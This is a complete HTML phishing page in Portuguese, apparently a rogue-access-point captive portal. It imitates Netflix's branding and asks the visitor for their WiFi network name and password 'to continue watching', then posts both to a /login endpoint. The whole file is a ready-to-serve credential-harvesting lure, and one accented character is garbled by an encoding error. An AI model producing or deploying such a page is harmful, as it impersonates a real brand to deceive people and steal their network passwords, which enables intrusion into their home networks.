<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - Conectar WiFi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: #000;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            background-image: 
                linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)),
                url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 800"><rect fill="%23141414" width="1200" height="800"/></svg>');
        }

        .container {
            background: rgba(0, 0, 0, 0.75);
            padding: 60px 68px 40px;
            border-radius: 4px;
            max-width: 450px;
            width: 100%;
            backdrop-filter: blur(10px);
        }

        .logo {
            color: #E50914;
            font-size: 40px;
            font-weight: bold;
            text-align: center;
            margin-bottom: 28px;
            letter-spacing: 2px;
        }

        h1 {
            font-size: 32px;
            margin-bottom: 28px;
            font-weight: 500;
        }

        .form-group {
            margin-bottom: 16px;
        }

        input {
            width: 100%;
            padding: 16px 20px;
            background: #333;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
        }

        input::placeholder {
            color: #8c8c8c;
        }

        input:focus {
            outline: none;
            background: #454545;
        }

        button {
            width: 100%;
            padding: 16px;
            background: #E50914;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 24px;
            transition: background 0.2s;
        }

        button:hover {
            background: #f40612;
        }

        .info {
            margin-top: 16px;
            font-size: 13px;
            color: #737373;
            text-align: center;
        }

        .help {
            margin-top: 20px;
            text-align: center;
        }

        .help a {
            color: #fff;
            text-decoration: none;
            font-size: 13px;
        }

        .help a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">NETFLIX</div>
        <h1>Conectar WiFi</h1>
        
        <form action="/login" method="POST">
            <div class="form-group">
                <input type="text" name="ssid" placeholder="Nome da rede WiFi" required>
            </div>

            <div class="form-group">
                <input type="password" name="password" placeholder="Senha" required>
            </div>

            <button type="submit">Conectar</button>

            <div class="info">
                Para continuar assistindo, conecte-se Ã  sua rede WiFi.
            </div>
        </form>

        <div class="help">
            <a href="#">Problemas para conectar?</a>
        </div>
    </div>
</body>
</html>
